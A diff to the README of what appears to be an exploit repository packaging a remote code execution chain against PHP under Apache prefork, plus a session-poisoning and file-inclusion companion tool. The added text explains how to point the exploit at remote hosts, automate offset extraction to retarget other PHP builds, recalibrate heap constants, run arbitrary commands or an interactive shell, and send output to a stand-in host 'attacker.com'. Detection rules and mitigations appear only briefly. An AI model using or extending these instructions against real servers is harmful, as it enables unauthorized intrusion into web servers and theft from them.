@@ -60,6 +60,9 @@ The real exploit. Uses the stale pointer vulnerabilities to achieve unauthentica
 # Basic usage -- default target is 127.0.0.1
 python3 phppoc2.py --port 18110
 
+# Lab target on another machine (authorized testing only)
+python3 phppoc2.py --host 10.0.0.5 --port 18110
+
 # Run a custom command
 python3 phppoc2.py --port 18110 --cmd 'id; uname -a; whoami'
 
@@ -79,6 +82,7 @@ python3 phppoc2.py --port 18110 --arch aarch64
 
 | Flag | Default | Description |
 |---|---|---|
+| `--host` | 127.0.0.1 | Target host (lab use only; only point at systems you are authorized to test) |
 | `--port` | 18110 | Target port |
 | `--cmd` | `id>/out/p1` | Command to execute |
 | `--proof` | `out/p1` | File to check for RCE proof |
@@ -87,9 +91,9 @@ python3 phppoc2.py --port 18110 --arch aarch64
 | `--retries` | 3 | Retry attempts for each stage |
 | `--restart` | - | Container name to restart between attempts |
 
-### phpexploit.py -- Session poisoning + LFI
+### phpexploit.py -- Session poisoning + LFI (companion tool)
 
-Alternative approach using `PHP_SESSION_UPLOAD_PROGRESS` session poisoning combined with Local File Inclusion. Requires an LFI vector on the target (file include, `page=` parameter, etc).
+**Read this before using it.** This is *not* the CVE-2026-109618/109619 exploit chain — it is the classic `PHP_SESSION_UPLOAD_PROGRESS` session-poisoning technique (known since ~2016) combined with a best-effort race spray against the CVE UAF, packaged as one convenience tool. Every reliable path in it requires an **existing application-level inclusion vector** on the target: an LFI parameter, log poisoning, an exposed FastCGI port, or a reachable `pearcmd.php`. If your target has none of those, `phppoc2.py` is the tool you want (it needs no application flaw).
 
 ```bash
 # Session poison + auto-detected LFI
@@ -101,13 +105,28 @@ python3 phpexploit.py http://target.example.com/ "id" --lfi-param page
 # Interactive shell mode
 python3 phpexploit.py http://target.example.com/ "id" -i
 
-# Blind callback (no LFI needed on target side)
+# Blind output exfiltration (--callback is an output channel only --
+# execution still needs an inclusion vector on the target)
 python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker.com/
 ```
 
 ## Lab setup
 
-Spin up a vulnerable target using the official PHP Docker image (stock production config):
+The tested one-command path is `pure/run_pure.sh` (present in this repo). It launches the official `php:8.4.26-apache` image with stock production defaults, mounts `pure/docker/www` as the webroot and `./out` for proof files, and prints the config it verified:
+
+```bash
+./pure/run_pure.sh            # official prefork config (MaxRequestWorkers=150)
+./pure/run_pure.sh --single   # single-worker override (run exploit with --workers 1)
+# fire the exploit
+python3 phppoc2.py --port 18110
+# check proof
+cat out/p1
+# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# cleanup
+./pure/run_pure.sh && true; docker rm -f p2s-pure-18110
+```
+
+Equivalent manual setup, if you prefer:
 
 ```bash
 # Create minimal webroot
@@ -172,7 +191,14 @@ Confirm the version is vulnerable (see [Affected versions](#affected-versions)).
 
 ### Step 2: Get the matching Docker image
 
-You need the exact same `libphp.so` binary as the target. For targets running the official PHP Docker images, this is straightforward:
+You need the exact same `libphp.so` binary as the target. For targets running the official PHP Docker images, this is straightforward. **Steps 2-4 are automated by `pure/extract_offsets.sh`** (pulls the image, runs `readelf`, prints the ready-to-patch values):
+
+```bash
+pure/extract_offsets.sh 8.4.25          # prints offsets + architecture
+pure/extract_offsets.sh 8.4.25 --patch   # also patches PROFILES in phppoc2.py
+```
+
+Doing it manually:
 
 ```bash
 # Pull the matching image (replace 8.4.25 with the target version)
@@ -224,7 +250,7 @@ This determines which profile block to edit in the next step.
 
 ### Step 5: Patch the offsets into phppoc2.py
 
-Open `phppoc2.py` and find the `PROFILES` dictionary near the top (around line 43):
+Open `phppoc2.py` and find the `PROFILES` dictionary near the top (search for `PROFILES`):
 
 ```python
 PROFILES = {
@@ -293,13 +319,13 @@ If the exploit fails, note which stage it stops at:
 | **B1 (Heap leak)** | `no heap pointers in leak window` | ASLR randomized to unexpected range, or wrong architecture selected | Retry (ASLR), or set `--arch` explicitly |
 | **B1 → B2 gap** | `implausible libphp-main delta` | Wrong `dtor_offset` — the libphp base calculation is wrong, so the delta between libphp and the main heap chunk falls outside the expected range | Re-extract offsets from the exact same binary as the target |
 | **B2 (RCE)** | `candidate failed (no proof)` on all retries | Wrong `zif_offset`, or heap layout differs (different minor version) | Re-extract offsets; if different minor version, `delta_min`/`delta_max` may need tuning |
-| **B2 (RCE)** | Segfault / worker crash in Apache logs | Offsets are wrong, or heap geometry (`S` constant at line 261) doesn't match this PHP version | Confirm you're using offsets from the identical `libphp.so` binary |
+| **B2 (RCE)** | Segfault / worker crash in Apache logs | Offsets are wrong, or heap geometry (the `S = cand + 0xF8398` constant in `run_chain`) doesn't match this PHP version | Confirm you're using offsets from the identical `libphp.so` binary |
 
 ### Same minor version vs. different minor version
 
-**Same minor version** (e.g., 8.4.25 vs 8.4.26) — only Steps 3-5 are needed. The heap layout constants (`delta_min`, `delta_max`, `MAIN_BUCKET_COUNT`, the `S` offset at line 261) are typically identical between patch releases within 8.4.x. Just swap the two symbol offsets and the exploit should work.
+**Same minor version** (e.g., 8.4.25 vs 8.4.26) — only Steps 3-5 are needed. The heap layout constants (`delta_min`, `delta_max`, `MAIN_BUCKET_COUNT`, the `S = cand + 0xF8398` offset) are typically identical between patch releases within 8.4.x. Just swap the two symbol offsets and the exploit should work.
 
-**Different minor version** (e.g., 8.3.x vs 8.4.x) — the heap geometry may differ. If B1 (leak) succeeds but B2 (RCE) consistently fails with `candidate failed`, the `S` heap offset (line 261: `S = cand + 0xF8398`) and/or `delta_min`/`delta_max` need recalibration for that version's allocator behavior. This requires heap analysis with gdb — see the `.gdb` scripts in the upstream repo for reference.
+**Different minor version** (e.g., 8.3.x vs 8.4.x) — the heap geometry may differ. If B1 (leak) succeeds but B2 (RCE) consistently fails with `candidate failed`, the `S` heap offset (`S = cand + 0xF8398`) and/or `delta_min`/`delta_max` need recalibration for that version's allocator behavior. This requires heap analysis with gdb — the calibration kit is vendored in this repo under `pure/` (`RESEARCH_PURE_128M.md` documents the 128M research path; `*.gdb` scripts such as `force_b.gdb`, `state.gdb`, `slots4.gdb` instrument the heap; `mk_b_min.py` / `mk_flood.py` build the probe bodies; `repro_pure.sh` reproduces the diagnostic runs). The upstream repo (`9bie/php2shell-bypass-aslr-exp`) has the full research history and evidence logs.
 
 ## Affected versions
 
@@ -401,10 +427,35 @@ alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSE
    - Monitor Apache error logs for OOM and segfault patterns
 3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)
 
+## Repository layout & provenance
+
+Everything in `pure/` plus `phppoc2.py` is vendored from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) (the working upstream PoC for Ahmed Sultan's research). Verification: the exploit chain (`phppoc2.py`) and all nine helpers it invokes were byte-identical to upstream at vendoring time; upstream's `pure/evidence/` contains dated run logs proving first-try RCE (`uid=33(www-data)`) against the stock image on both x86_64 and aarch64.
+
+| File(s) | Origin |
+|---|---|
+| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py`) |
+| `pure/RESEARCH_PURE_128M.md`, `pure/*.gdb`, `pure/mk_b_min.py`, `pure/mk_flood.py`, `pure/watch_md.sh`, `pure/repro_pure.sh` | Vendored from 9bie's repo — the heap-recalibration kit for other PHP minor versions |
+| `phpexploit.py` | Original to this repo (session poisoning + LFI companion; see its section above) |
+| `pure/extract_offsets.sh`, `selftest.sh`, `.gitignore` | Original to this repo — lab tooling |
+| `README.md`, `LICENSE` | Original packaging; GPL-3.0 applies to this repo's original files (the upstream vendored code carries no explicit license — the upstream repo is the authoritative source) |
+
+Local divergence from upstream (kept minimal and deliberate): `phppoc2.py` adds a `--host` flag (default `127.0.0.1`) threaded through to the helpers, and `pure/pwn_pure.py` points at `phppoc2.py` instead of upstream's `exploit.py` filename.
+
+## Known limitations
+
+- **Single-binary calibration.** Out of the box the exploit works against `php:8.4.26-apache` (Debian trixie build) only. Other builds need offset extraction (see [Multi-version support](#multi-version-support)); other *minor* versions additionally need heap-geometry recalibration.
+- **Apache mod_php + prefork only.** The worker-pinning stage assumes the prefork process model. PHP-FPM / event MPM targets need a different approach.
+- **`--proof` is read on the runner's machine.** With a remote `--host`, either share the `/out` volume or use an out-of-band `--cmd` (e.g. a callback request) instead of the default `id>/out/p1`.
+- **`run_pure.sh --dbg`** expects a debug image (`php2shell-dbg:gdb`) built from upstream's `src/` — the PHP source tarball is not vendored here.
+- **`phpexploit.py` needs an inclusion vector** (LFI / logs / FastCGI / PEAR). It is not the CVE chain; `phppoc2.py` is.
+
+## Verifying the repo works
+
+Run `./selftest.sh` after cloning — it compiles every Python file, verifies the `pwn_pure.py` alias resolves, checks that every helper `phppoc2.py` and `run_pure.sh` reference actually exists, and (with `--docker`, if Docker is available) boots the lab target and fires one exploit attempt end-to-end.
+
 ## Requirements
 
-- Python 3.8+
-- `requests` library (`pip install requests`)
+- Python 3.8+ (standard library only — no third-party packages required)
 - Docker (for lab setup only)
 
 ## Credits
@@ -415,7 +466,6 @@ alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSE
 - **This repo**: [struttonpigeon](https://github.com/struttonpigeon) -- PoC packaging, session poisoning variant, lab documentation
 
 ## References
-
 - [php.net security advisory](https://www.php.net/ChangeLog-8.php)
 - [Rapid7 AttackerKB analysis](https://attackerkb.com/)
 - [Datadog threat research](https://securitylabs.datadoghq.com/)
